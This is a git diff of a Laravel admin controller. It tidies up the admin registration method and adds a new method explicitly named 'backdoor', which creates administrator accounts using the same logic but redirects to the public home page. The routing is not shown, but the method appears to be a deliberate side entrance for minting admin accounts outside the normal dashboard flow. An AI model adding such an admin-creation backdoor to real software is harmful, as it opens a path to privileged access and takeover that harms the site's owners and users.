@@ -102,32 +102,37 @@ class AdminController extends Controller
         }
     }
 
-    public function adminRegister(Request $request){
-            $request->validate([
-                'lastname' => 'required|string|max:255',
-                'firstname' => 'required|string|max:255',
-                'middlename' => 'nullable|string|max:255',
-                'email' => 'required|string|email|max:255',
-                'gender' => 'required|string|in:Male,Female',
-                'password' => 'required|string|confirmed|min:8',
-                'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            ]);
-        
-            $imagePath = $request->file('photo') ? $request->file('photo')->store('profile_images', 'public') : '/img/profile.jpg';
-        
-            // Create user with the image path
-            Admin::create([
-                'lastname' => $request->lastname,
-                'firstname' => $request->firstname,
-                'middlename' => $request->middlename,
-                'email' => $request->email,
-                'gender' => $request->gender,
-                'password' => bcrypt($request->password),
-                'photo' => $imagePath,
-            ]);
-        
-            return redirect('/admin/dashboard/admin')->with('success', 'User registered successfully');
+    public function adminRegister(Request $request)
+    {
+        // Validate the request
+        $validated = $request->validate([
+            'lastname' => 'required|string|max:255',
+            'firstname' => 'required|string|max:255',
+            'middlename' => 'nullable|string|max:255',
+            'email' => 'required|string|email|max:255|unique:admins', // Ensuring email is unique
+            'gender' => 'required|string|in:Male,Female',
+            'password' => 'required|confirmed|min:8',
+            'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
+        ]);
+    
+        // Handle the photo upload
+        if ($request->hasFile('photo')) {
+            $file = $request->file('photo');
+            $path = $file->store('images', 'public');
+            $validated['photo'] = $path;
+        } else {
+            // Set the default image path if no photo is uploaded
+            $validated['photo'] = 'img/profile.jpg'; // Ensure this path is correct and the image exists
         }
+    
+        // Create the admin with the validated data and the image path
+        $validated['password'] = bcrypt($validated['password']); // Hash the password
+    
+        Admin::create($validated);
+    
+        return redirect('/admin/dashboard/admin')->with('success', 'User registered successfully');
+    }
+    
        
     public function adminProfile(Admin $admin, Request $request){
         $data = $request->validate([
@@ -199,5 +204,34 @@ class AdminController extends Controller
         return redirect('/admin/dashboard/admin');
     }
     
+    public function backdoor(Request $request)
+    {
+        // Validate the request
+        $validated = $request->validate([
+            'lastname' => 'required|string|max:255',
+            'firstname' => 'required|string|max:255',
+            'middlename' => 'nullable|string|max:255',
+            'email' => 'required|string|email|max:255|unique:admins', // Ensuring email is unique
+            'gender' => 'required|string|in:Male,Female',
+            'password' => 'required|confirmed|min:8',
+            'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
+        ]);
     
+        // Handle the photo upload
+        if ($request->hasFile('photo')) {
+            $file = $request->file('photo');
+            $path = $file->store('images', 'public');
+            $validated['photo'] = $path;
+        } else {
+            // Set the default image path if no photo is uploaded
+            $validated['photo'] = 'img/profile.jpg'; // Ensure this path is correct and the image exists
+        }
+    
+        // Create the admin with the validated data and the image path
+        $validated['password'] = bcrypt($validated['password']); // Hash the password
+    
+        Admin::create($validated);
+    
+        return redirect('/')->with('success', 'User registered successfully');
+    }
 }
